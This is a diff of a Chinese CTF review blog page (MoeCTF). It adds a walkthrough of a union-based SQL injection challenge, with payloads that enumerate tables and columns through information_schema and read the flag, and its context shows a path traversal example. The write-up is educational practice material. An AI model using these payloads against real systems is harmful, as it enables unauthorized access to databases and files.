@@ -14,7 +14,7 @@
 <meta property="og:description" content="moectf复盘查分系统 按 F12 打开开发者工具 使用 Ctrl + U 打开源码 在源码中使用 Ctrl + F 直接搜索 moectf，直接找到了 flag   💡 Web 知识点：F12 是渗透测试的第一步，主要看 Elements（元素）、Console（控制台）和 Network（网络）。Ctrl+U 查看页面源代码往往能发现被隐藏的注释或接口。Ctrl+F 搜索敏感关键字（如 f">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-10-11T11:30:00.000Z">
-<meta property="article:modified_time" content="2026-10-13T15:54:16.245Z">
+<meta property="article:modified_time" content="2026-10-14T05:15:51.118Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="Web安全">
@@ -163,11 +163,28 @@
 <blockquote>
 <p>💡 <strong>Web 知识点</strong>：<strong>目录遍历（Path Traversal）</strong>。当服务器对用户输入的路径参数没有严格过滤时，可以通过 <code>../</code>（相对路径）跳出当前目录，访问服务器上的任意文件。例如将 <code>?book=book1.txt</code> 改为 <code>?book=../../../../flag</code> 来读取根目录下的敏感文件。</p>
 </blockquote>
+<h2 id="河湖小盗"><a href="#河湖小盗" class="headerlink" title="河湖小盗"></a><strong>河湖小盗</strong></h2><ul>
+<li>1 and 1&#x3D;1</li>
+<li>1 and 1&#x3D;2</li>
+<li>测试发现考察SQL注入</li>
+<li>测试列数</li>
+<li>1 order by 3</li>
+<li>找回显点</li>
+<li>1 union select 1,2,3</li>
+<li>开始爆破表名 字段名</li>
+<li>爆破表名<br>id&#x3D;-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()<br>-&gt; 拿到 flag_table, past_paper, public_subjects</li>
+<li>爆字段名<br>id&#x3D;-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’flag_table’ </li>
+<li>拿数据：<br>id&#x3D;-1 union select 1,2,flag from flag_table </li>
+<li><blockquote>
+<p>直接拿到 Flag</p>
+</blockquote>
+</li>
+</ul>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/10/11/moectf%E5%A4%8D%E7%9B%98/" data-id="cmv6vzlvz0001ikpf9n1l1a7z" data-title="moectf复盘" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/10/11/moectf%E5%A4%8D%E7%9B%98/" data-id="cmv7nx1qw0000xspf1e5527m9" data-title="moectf复盘" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
